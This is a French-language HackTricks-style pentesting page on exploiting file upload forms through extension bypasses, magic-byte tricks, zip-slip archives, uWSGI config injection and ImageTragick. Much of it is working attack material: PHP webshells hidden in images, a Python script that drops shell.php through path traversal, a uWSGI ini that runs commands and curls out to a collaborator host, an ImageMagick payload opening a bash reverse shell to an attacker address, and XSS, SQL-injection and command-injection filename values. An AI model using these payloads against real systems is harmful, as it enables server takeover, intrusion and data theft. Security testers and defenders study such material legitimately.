# Téléversement de fichiers

{{#include ../../banners/hacktricks-training.md}}

## Méthodologie générale de téléversement de fichiers

Autres extensions utiles :

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Contourner les vérifications d'extensions de fichiers

1. Si elles s'appliquent, **vérifiez** les **extensions précédentes.** Testez-les aussi en utilisant des **lettres majuscules** : _pHp, .pHP5, .PhAr ..._
2. _Vérifiez **l'ajout d'une extension valide avant** l'extension d'exécution (utilisez aussi les extensions précédentes) :_
- _file.png.php_
- _file.png.Php5_
3. Essayez d'ajouter **des caractères spéciaux à la fin.** Vous pouvez utiliser Burp pour **bruteforcer** tous les caractères **ascii** et **Unicode**. (_Notez que vous pouvez aussi essayer d'utiliser les **extensions** mentionnées précédemment_)  
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Essayez de contourner les protections en **trompant le parseur d'extensions** côté serveur avec des techniques comme le **doublage** de l'**extension** ou **l'ajout de données junk** (octets **null**) entre les extensions. _Vous pouvez aussi utiliser les **extensions** précédentes pour préparer un meilleur payload._  
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Ajoutez **une autre couche d'extensions** aux contrôles précédents :
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Essayez de mettre l'**extension d'exécution avant l'extension valide** et espérez que le serveur est mal configuré. (utile pour exploiter des misconfigurations Apache où tout ce qui a l'extension **.php**, mais **n'ayant pas nécessairement .php à la fin**, exécutera du code) :  
- _ex: file.php.png_
7. Utilisation des **NTFS alternate data stream (ADS)** sous **Windows**. Dans ce cas, un caractère deux-points ":" sera inséré après une extension interdite et avant une autorisée. En conséquence, un **fichier vide avec l'extension interdite** sera créé sur le serveur (par ex. "file.asax:.jpg”). Ce fichier pourrait être édité plus tard via d'autres techniques comme l'utilisation de son short filename. Le pattern "**::$data**” peut aussi être utilisé pour créer des fichiers non vides. Ainsi, l'ajout d'un point après ce pattern peut aussi être utile pour contourner d'autres restrictions (par ex. "file.asp::$data.”)
8. Essayez de dépasser les limites de nom de fichier. L'extension valide est tronquée. Et le PHP malveillant reste. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Contourner Content-Type, Magic Number, Compression & Redimensionnement

- Contournez les vérifications de **Content-Type** en définissant la **valeur** de l'en-tête **Content-Type** sur : _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Contournez la vérification du **magic number** en ajoutant au début du fichier les **octets d'une vraie image** (pour tromper la commande _file_). Ou introduisez le shell dans les **metadata** :\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ou vous pouvez aussi **introduire le payload directement** dans une image :\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Si une **compression** est appliquée à votre image, par exemple via des bibliothèques PHP standards comme [PHP-GD](https://www.php.net/manual/fr/book.image.php), les techniques précédentes ne seront pas utiles. Cependant, vous pouvez utiliser le **PLTE chunk** [**technique définie ici**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) pour insérer du texte qui **survivra à la compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- La page web peut aussi **redimensionner** l'**image**, par exemple en utilisant les fonctions PHP-GD `imagecopyresized` ou `imagecopyresampled`. Cependant, vous pouvez utiliser le **IDAT chunk** [**technique définie ici**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) pour insérer du texte qui **survivra à la compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Une autre technique pour créer un payload qui **survit à un redimensionnement d'image**, utilisant la fonction PHP-GD `thumbnailImage`. Cependant, vous pouvez utiliser le **tEXt chunk** [**technique définie ici**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) pour insérer du texte qui **survivra à la compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Autres astuces à vérifier

- Trouvez une vulnérabilité permettant de **renommer** le fichier déjà uploadé (pour changer l'extension).
- Trouvez une vulnérabilité **Local File Inclusion** pour exécuter le backdoor.
- **Divulgation d'information possible** :
1. Téléversez **plusieurs fois** (et en **même temps**) le **même fichier** avec le **même nom**
2. Téléversez un fichier portant le **nom** d'un **fichier** ou d'un **dossier** qui **existe déjà**
3. Téléverser un fichier nommé **"." , ".." ou "…"**. Par exemple, sous Apache sur **Windows**, si l'application sauvegarde les fichiers uploadés dans "/www/uploads/", le nom de fichier "." créera un fichier appelé "uploads" dans le répertoire "/www/".
4. Téléversez un fichier qui peut ne pas être facilement supprimé, comme **"…:.jpg”** sur **NTFS**. (Windows)
5. Téléversez un fichier sous **Windows** avec des **caractères invalides** tels que `|<>*?”` dans son nom. (Windows)
6. Téléversez un fichier sous **Windows** en utilisant des noms **réservés** (**interdits**) tels que CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, et LPT9.
- Essayez aussi de **téléverser un exécutable** (.exe) ou un **.html** (moins suspect) qui **exécutera du code** si ouvert accidentellement par la victime.

### Astuces spéciales d'extension

Si vous essayez de téléverser des fichiers sur un **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Si vous essayez de téléverser des fichiers sur un **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Les fichiers `.phar` sont comme les `.jar` pour java, mais pour php, et peuvent être **utilisés comme un fichier php** (exécutés avec php, ou inclus dans un script...)

L'extension `.inc` est parfois utilisée pour des fichiers php qui ne sont utilisés que pour **importer des fichiers**, donc, à un moment donné, quelqu'un pourrait avoir permis **l'exécution de cette extension**.

## **Jetty RCE**

Si vous pouvez téléverser un fichier XML dans un serveur Jetty, vous pouvez obtenir une RCE car les nouveaux *.xml et *.war sont automatiquement traités. Donc, comme indiqué dans l'image suivante, téléversez le fichier XML dans `$JETTY_BASE/webapps/` et attendez le shell !

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Pour une exploration détaillée de cette vulnérabilité, consultez la recherche originale : [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Les vulnérabilités Remote Command Execution (RCE) peuvent être exploitées sur des serveurs uWSGI si l'on a la capacité de modifier le fichier de configuration `.ini`. Les fichiers de configuration uWSGI utilisent une syntaxe spécifique pour incorporer des variables "magiques", des placeholders et des opérateurs. Notamment, l'opérateur '@', utilisé sous la forme `@(filename)`, est conçu pour inclure le contenu d'un fichier. Parmi les différents schemes supportés par uWSGI, le scheme "exec" est particulièrement puissant, permettant la lecture des données depuis la sortie standard d'un processus. Cette fonctionnalité peut être manipulée à des fins malveillantes telles que Remote Command Execution ou Arbitrary File Write/Read lorsqu'un fichier de configuration `.ini` est traité.

Considérez l'exemple suivant d'un fichier `uwsgi.ini` malveillant, montrant divers schemes :
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'exécution du payload se produit lors de l'analyse du fichier de configuration. Pour que la configuration soit activée et analysée, le processus uWSGI doit soit être redémarré (potentiellement après un crash ou en raison d'une Denial of Service attack) soit le fichier doit être configuré en auto-reload. La fonctionnalité auto-reload, si elle est activée, recharge le fichier à des intervalles spécifiés lorsqu'elle détecte des changements.

Il est crucial de comprendre le caractère laxiste de l'analyse des fichiers de configuration de uWSGI. Plus précisément, le payload évoqué peut être inséré dans un fichier binaire (tel qu'une image ou un PDF), élargissant ainsi la portée des possibilités d'exploitation.

## **wget File Upload/SSRF Trick**

Dans certains cas, vous pouvez constater qu'un serveur utilise **`wget`** pour **télécharger des fichiers** et que vous pouvez **indiquer** l'**URL**. Dans ces situations, le code peut vérifier que l'extension des fichiers téléchargés figure dans une whitelist pour s'assurer que seuls des fichiers autorisés seront téléchargés. Cependant, **this check can be bypassed.**\
La longueur maximale d'un filename sous linux est de 255, cependant, `wget` tronque les filenames à 236 caractères. Vous pouvez télécharger un fichier appelé "A"\*232+".php"+".gif", ce nom de fichier bypassera la vérification (comme dans cet exemple ".gif" est une extension valide) mais `wget` renommera le fichier en "A"\*232+".php".
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Notez que **une autre option** à laquelle vous pourriez penser pour contourner cette vérification est de faire en sorte que le **serveur HTTP redirige vers un fichier différent**, ainsi l'URL initiale contournera la vérification puis wget téléchargera le fichier redirigé avec le nouveau nom. Cela **ne fonctionnera pas** **sauf si** wget est utilisé avec le **paramètre** `--trust-server-names` parce que **wget téléchargera la page redirigée avec le nom du fichier indiqué dans l'URL originale**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) est un outil puissant conçu pour aider les Pentesters et Bug Hunters à tester les mécanismes d'upload de fichiers. Il exploite diverses techniques de bug bounty pour simplifier le processus d'identification et d'exploitation des vulnérabilités, garantissant des évaluations approfondies des applications web.

### Corrupting upload indices with snprintf quirks (historical)

Certains handlers d'upload legacy qui utilisent `snprintf()` ou des fonctions similaires pour construire des tableaux multi-fichiers à partir d'un upload single-file peuvent être trompés pour forger la structure `_FILES`. En raison d'incohérences et de troncatures dans le comportement de `snprintf()`, un upload soigneusement construit peut apparaître comme plusieurs fichiers indexés côté serveur, perturbant la logique qui suppose une forme stricte (par ex., la traiter comme un upload multi-fichiers et prendre des branches non sûres). Bien que niche aujourd'hui, ce pattern de «corruption d'indices» réapparaît occasionnellement dans des CTFs et des bases de code plus anciennes.

## From File upload to other vulnerabilities

- Définissez **filename** sur `../../../tmp/lol.png` et essayez d'obtenir un **path traversal**
- Définissez **filename** sur `sleep(10)-- -.jpg` et vous pourrez peut-être obtenir une **SQL injection**
- Définissez **filename** sur `<svg onload=alert(document.domain)>` pour obtenir une **XSS**
- Définissez **filename** sur `; sleep 10;` pour tester de l'command injection (plus de [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Essayez **différents payloads svg** depuis [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Si vous pouvez **indiquer au web server de récupérer une image depuis une URL** vous pouvez tenter d'abuser d'un [SSRF](../ssrf-server-side-request-forgery/index.html). Si cette **image** doit être **enregistrée** sur un site **public**, vous pouvez aussi indiquer une URL depuis [https://iplogger.org/invisible/] et **voler les informations de chaque visiteur**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- PDFs spécialement conçus pour du XSS : la [page suivante présente comment **injecter des données PDF pour obtenir l'exécution de JS**](../xss-cross-site-scripting/pdf-injection.md). Si vous pouvez uploader des PDFs, vous pouvez préparer un PDF qui exécutera du JS arbitraire en suivant les indications données.
- Téléversez le \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) contenu pour vérifier si le serveur dispose d'un **antivirus**
- Vérifiez s'il y a une **limite de taille** lors de l'upload de fichiers

Voici un top 10 des choses que vous pouvez accomplir en téléversant (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

Si vous pouvez uploader un ZIP qui sera décompressé sur le serveur, vous pouvez faire 2 choses :

### Symlink

Téléversez une archive contenant des soft links vers d'autres fichiers ; ensuite, en accédant aux fichiers décompressés vous atteindrez les fichiers liés :
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Décompress dans différents dossiers

La création inattendue de fichiers dans des répertoires lors de la décompression est un problème important. Malgré l'hypothèse initiale que cette configuration pourrait protéger contre l'exécution de commandes au niveau du système d'exploitation via des uploads de fichiers malveillants, le support de la compression hiérarchique et les possibilités de traversal de répertoire du format d'archive ZIP peuvent être exploités. Cela permet aux attaquants de contourner les restrictions et de sortir des répertoires d'upload sécurisés en manipulant la fonctionnalité de décompression de l'application ciblée.

Un exploit automatisé permettant de créer de tels fichiers est disponible sur [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). L'utilitaire peut être utilisé comme suit :
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
De plus, l'**symlink trick with evilarc** est une option. Si l'objectif est de cibler un fichier comme `/flag.txt`, un symlink vers ce fichier doit être créé sur votre système. Cela garantit qu'evilarc ne rencontre pas d'erreurs lors de son exécution.

Ci-dessous un exemple de code Python utilisé pour créer un fichier zip malveillant :
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Pour plus de détails **consultez l'article original sur** : [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Du code PHP est écrit pour exécuter des commandes transmises via la variable `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Plusieurs fichiers sont créés et une archive zip est assemblée contenant ces fichiers.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Les noms des fichiers à l'intérieur du zip sont modifiés en utilisant vi ou un éditeur hexadécimal, changeant "xxA" en "../" pour traverser les répertoires.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Téléversez ce contenu avec une extension d'image pour exploiter la vulnérabilité **(ImageMagick , 7.0.1-1)** (voir l'exploit: [https://www.exploit-db.com/exploits/39767](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Insertion d'un PHP Shell dans un fichier PNG

L'insertion d'un PHP shell dans le chunk IDAT d'un fichier PNG peut efficacement contourner certaines opérations de traitement d'image. Les fonctions `imagecopyresized` et `imagecopyresampled` de PHP-GD sont particulièrement pertinentes dans ce contexte, car elles sont couramment utilisées pour redimensionner et rééchantillonner les images, respectivement. Le fait que le PHP shell incorporé reste inchangé par ces opérations est un avantage important pour certains cas d'utilisation.

Une exploration détaillée de cette technique, incluant sa méthodologie et ses applications potentielles, est fournie dans l'article suivant : ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Cette ressource offre une compréhension complète du processus et de ses implications.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Les polyglot files servent d'outil unique en cybersécurité, agissant comme des caméléons qui peuvent exister valablement dans plusieurs formats de fichiers simultanément. Un exemple intrigant est un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un hybride qui fonctionne à la fois comme un GIF et comme une archive RAR. De tels fichiers ne se limitent pas à cette combinaison ; des associations comme GIF et JS ou PPT et JS sont aussi réalisables.

L'utilité principale des polyglot files réside dans leur capacité à contourner des mesures de sécurité qui filtrent les fichiers en fonction du type. La pratique courante dans diverses applications consiste à n'autoriser que certains types de fichiers pour l'upload — comme JPEG, GIF ou DOC — afin de réduire le risque posé par des formats potentiellement dangereux (par ex. JS, PHP ou Phar). Cependant, un polyglot, en respectant les critères structurels de plusieurs types de fichiers, peut contourner discrètement ces restrictions.

Malgré leur adaptabilité, les polyglots rencontrent des limitations. Par exemple, alors qu'un polyglot peut simultanément représenter un fichier PHAR (PHp ARchive) et un JPEG, le succès de son upload peut dépendre de la politique d'extensions du système. Si la plateforme est stricte sur les extensions autorisées, la simple dualité structurelle d'un polyglot peut ne pas suffire pour garantir son upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Comment éviter les détections de type de fichier en uploadant un fichier JSON valide même si ce n'est pas autorisé en le faisant passer pour un PDF (techniques tirées de **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**) :

- **`mmmagic` library** : Tant que les octets magiques `%PDF` se trouvent dans les 1024 premiers octets, c’est considéré comme valide (voir exemple dans le post)
- **`pdflib` library** : Ajouter un faux format PDF à l'intérieur d'un champ du JSON pour que la library pense que c'est un pdf (voir exemple dans le post)
- **`file` binary** : Il peut lire jusqu'à 1048576 octets d'un fichier. Il suffit de créer un JSON plus grand que ça pour qu'il ne puisse pas parser le contenu comme du json et ensuite, à l'intérieur du JSON, placer la partie initiale d'un vrai PDF et il le considérera comme un PDF

## Références

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
